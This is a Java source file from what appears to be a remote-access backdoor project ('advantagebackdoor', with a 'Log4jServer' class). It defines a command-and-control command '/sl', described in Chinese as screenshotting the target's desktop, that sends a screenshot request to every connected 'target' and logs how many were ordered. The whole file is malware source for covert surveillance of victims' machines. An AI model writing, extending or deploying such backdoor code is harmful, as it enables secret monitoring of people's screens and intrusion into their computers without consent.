package me.faintcloudy.advantagebackdoor.server.command;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.connection.UserConnection;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ScreenShotMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.server.RequestMessage;

public class ScreenShotCommand extends ServerCommand {
    public ScreenShotCommand() {
        super("/sl", "对目标桌面进行截屏");
    }

    @Override
    public void execute(String[] args) {
        for (UserConnection target : Log4jServer.getInstance().getTargets()) {
            target.sendMessage(new RequestMessage(ScreenShotMessage.class));
        }
        Log4jServer.getInstance().getLogger().info("已向 " + Log4jServer.getInstance().getTargets().size() + " 个目标下达了截屏命令");
    }
}
